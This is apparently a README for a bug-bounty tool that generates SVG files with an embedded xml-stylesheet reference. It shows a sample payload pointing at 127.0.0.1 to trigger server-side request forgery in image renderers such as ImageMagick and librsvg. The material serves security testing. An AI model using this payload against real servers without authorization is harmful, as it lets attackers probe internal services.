#  SVG SSRF Payload Generator

This repo generates SVG files with embedded XML stylesheet references for **SSRF testing**. It’s useful in bug bounty and security research when testing file upload features or backend image processing engines.

---

##  How It Works

Each SVG file contains an SSRF payload like this:

```xml
<?xml version="1.0" standalone="yes"?>
<?xml-stylesheet type="text/css" href="http://127.0.0.1:80"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="200" height="200" fill="red"/>
</svg>
```
When the server renders or parses this SVG (e.g. via ImageMagick, headless Chrome, librsvg, etc.), it tries to fetch the stylesheet — potentially triggering an SSRF.

## Use Cases
* Bug bounty testing

## Notes
For blind SSRF testing, use Burp Collaborator or [![Interactsh](https://github.com/projectdiscovery/interactsh)]

Works great against systems using: ImageMagick, librsvg, wkhtmltopdf, Chrome headless, or custom XML parsers.

Credits
Inspired by PayloadsAllTheThings, extended for automated use in SVG contexts.
